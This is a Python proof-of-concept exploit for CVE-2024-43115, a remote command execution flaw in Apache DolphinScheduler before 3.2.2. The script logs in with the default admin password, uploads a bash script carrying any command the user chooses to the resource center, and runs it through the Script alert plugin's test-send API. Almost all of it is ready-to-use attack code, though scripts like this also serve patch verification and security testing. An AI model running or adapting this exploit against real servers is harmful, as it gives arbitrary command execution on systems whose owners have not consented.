#!/usr/bin/env python3
"""
CVE-2024-43115 - Apache DolphinScheduler Alert Script RCE
Affected versions: < 3.2.2

An authenticated user can execute arbitrary shell scripts on the server
through the Script alert plugin by uploading a malicious script to the
resource center and then triggering it via the alert test-send API.
"""
import requests
import json
import sys
import time

class DolphinSchedulerExploit:
    def __init__(self, target, username="admin", password="dolphinscheduler123"):
        self.target = target.rstrip('/')
        self.base_url = f"{self.target}/dolphinscheduler"
        self.session = requests.Session()
        self.username = username
        self.password = password
        self.session_id = None
        self.script_name = "exploit"
    
    def login(self):
        url = f"{self.base_url}/login"
        data = {"userName": self.username, "userPassword": self.password}
        resp = self.session.post(url, data=data)
        result = resp.json()
        if result.get("code") == 0:
            self.session_id = result["data"]["sessionId"]
            self.session.cookies.set("sessionId", self.session_id)
            print(f"[+] Login successful")
            return True
        print(f"[-] Login failed: {result}")
        return False
    
    def get_script_plugin_id(self):
        url = f"{self.base_url}/ui-plugins/query-by-type"
        params = {"pluginType": "ALERT"}
        resp = self.session.get(url, params=params)
        result = resp.json()
        if result.get("code") == 0:
            for plugin in result.get("data", []):
                if plugin["pluginName"] == "Script":
                    print(f"[+] Found Script plugin, id: {plugin['id']}")
                    return plugin["id"]
        print("[-] Script plugin not found")
        return None
    
    def create_malicious_script(self, command):
        url = f"{self.base_url}/resources/online-create"
        script_content = f"#!/bin/bash\n{command}"
        data = {
            "type": "FILE",
            "fileName": self.script_name,
            "suffix": "sh",
            "content": script_content,
            "currentDir": "/"
        }
        resp = self.session.post(url, data=data)
        result = resp.json()
        if result.get("code") == 0:
            print(f"[+] Malicious script uploaded: {self.script_name}.sh")
            return True
        print(f"[*] Script may already exist or failed: {result.get('msg', '')}")
        return True
    
    def trigger_alert_script(self, plugin_id, script_path):
        url = f"{self.base_url}/alert-plugin-instances/test-send"
        plugin_params = json.dumps([
            {"field": "path", "name": "script.path", "props": None, "type": "input",
             "title": "Script Path", "value": script_path, "validate": None},
            {"field": "type", "name": "script.type",
             "props": {"options": [{"label": "SHELL", "value": "SHELL"}]},
             "type": "radio", "title": "Type", "value": "SHELL", "validate": None},
            {"field": "userParams", "name": "script.user.params", "props": None,
             "type": "input", "title": "User Params", "value": "", "validate": None}
        ])
        data = {"pluginDefineId": plugin_id, "pluginInstanceParams": plugin_params}
        resp = self.session.post(url, data=data)
        result = resp.json()
        return result
    
    def exploit(self, command="touch /tmp/pwned_by_CVE_2024_43115"):
        print(f"[*] Target: {self.target}")
        print(f"[*] Command: {command}")
        
        if not self.login():
            return False
        
        plugin_id = self.get_script_plugin_id()
        if not plugin_id:
            return False
        
        print("[*] Uploading malicious script to resource center...")
        self.create_malicious_script(command)
        
        script_path = f"/dolphinscheduler/default/resources/{self.script_name}.sh"
        print(f"[*] Script path: {script_path}")
        
        print("[*] Triggering alert script execution...")
        result = self.trigger_alert_script(plugin_id, script_path)
        
        msg = result.get("msg", "")
        if "success" in msg.lower():
            print(f"[+] Exploit executed successfully!")
            return True
        else:
            print(f"[*] Response: {result}")
            print("[*] Note: Script may need execute permission (chmod +x)")
            return False


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [command]")
        print(f"Example: {sys.argv[0]} http://localhost:12345 'touch /tmp/pwned'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "touch /tmp/pwned_by_CVE_2024_43115"
    
    exploit = DolphinSchedulerExploit(target)
    success = exploit.exploit(command)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
